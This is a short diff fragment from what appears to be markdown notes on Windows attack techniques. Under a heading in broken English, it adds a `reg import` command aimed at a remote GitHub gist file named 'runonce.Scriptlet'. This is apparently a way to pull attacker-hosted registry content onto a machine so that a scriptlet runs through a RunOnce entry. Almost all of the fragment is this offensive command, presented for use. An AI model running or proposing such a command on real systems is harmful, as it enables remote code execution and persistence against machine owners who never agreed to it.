@@ -24,3 +24,5 @@ PS C:\>
 ```
 
 ## At this point don't get away that you can import this registry file
+C:\> reg import 
+https://gist.githubusercontent.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae/raw/60b80e88c66fe58d2d906bb24f32925edd2fe025/runonce.Scriptlet
